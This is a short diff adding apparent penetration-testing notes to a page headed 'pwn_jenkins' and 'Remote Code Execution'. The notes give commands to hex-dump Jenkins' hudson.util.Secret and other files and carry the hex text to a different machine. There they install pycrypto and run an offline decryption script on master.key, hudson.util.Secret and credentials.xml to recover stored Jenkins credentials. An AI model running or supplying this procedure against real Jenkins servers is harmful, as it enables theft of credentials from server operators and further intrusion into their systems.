@@ -1,3 +1,21 @@
+```
+
+#sourcehttps://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py
+#this displays to termial hex content of file
+xxd -p file.txt
+xxd -p hudson.util.Secret | tr -d '\n'
+xxd -p file.txt | tr -d '\n'
+					
+					
+#on different machine-- place collected ascii string in 	
+xxd -r -ps hexascii.txt file.txt
+xxd -r -ps hexascii.txt hudson.util.Secret		
+/root  - python3.9 -m pip install pycrypto
+python3 ./jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
+
+```
+
+
 <img src="/pwn_jenkins.png" width="640">
 
 Remote Code Execution
